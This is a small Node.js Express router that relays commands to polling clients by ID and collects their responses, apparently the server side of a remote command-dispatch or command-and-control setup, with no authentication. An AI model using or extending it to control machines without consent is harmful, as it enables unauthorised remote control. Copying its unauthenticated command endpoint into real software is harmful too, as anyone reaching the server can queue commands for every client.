'use strict';
var express = require('express');
var router = express.Router();



var executing = {};
var response = {};

/* GET home page. */
router.get('/', function (req, res) {
    var keys = Object.keys(executing);
    res.render('index', { clients: keys });
});

router.get('/commands/:cid', function (req, res) {
    var w = executing[req.params.cid];
    executing[req.params.cid] = "";

    res.send(w)
});

router.put("/commands/:cid", function (req, res) {
    executing[req.params.cid] = req.body.cmd;
    res.send({ sent: true });
});

//client response
router.post("/commands/:cid", function (req, res) {
    response[req.params.cid] = req.body;
    res.send({ sent: true });
});

router.get("/any-response", function (req, res) {
    var responseStr = JSON.stringify(response);
    response = {};
    res.send(responseStr);

});



module.exports = router;
